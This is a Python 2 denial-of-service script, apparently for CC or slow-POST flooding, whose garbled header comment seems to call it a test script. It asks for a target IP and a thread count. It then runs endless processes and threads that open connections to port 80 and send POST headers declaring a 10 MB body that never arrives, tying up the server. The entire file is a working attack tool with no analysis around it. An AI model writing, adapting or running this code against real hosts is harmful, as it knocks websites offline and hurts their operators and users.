# -*- coding: utf-8 -*-
#DOS CC¹¥»÷²âÊÔ½Å±¾£¬ÇëÎð·Ç·¨ÓÃÍ¾
import socket, time
import threading
from multiprocessing import Pool

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = raw_input('please input IP:')
port = 80
PAGE="/index.php"
header = ("POST %s HTTP/1.1\r\n"
"Host: %s\r\n"
"Content-Length: 10000000\r\n"
"Cookie: dklkt_dos_test\r\n"
"\r\n" % (PAGE,host))

def deco(fuc):
    def new_fuc(threads):
        print 'Dos...'
        return fuc(threads)
    return new_fuc

def con_thread():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((host, port))
            s.send(header)
        except Exception, ex:
            print "Could not connect to server or send error:%s" % ex
            time.sleep(2)

def thread(temp):
    for i in range(temp):
        conn_th=threading.Thread(target=con_thread,args=())
        conn_th.start()
@deco
def start(threads):
    while True:
        p = Pool()
        for i in range(2):
            p.apply_async(thread, args=(int(threads),))
        p.close()
        p.join()

if __name__ == '__main__':
    threads = raw_input('please input threads:')
    start(threads)


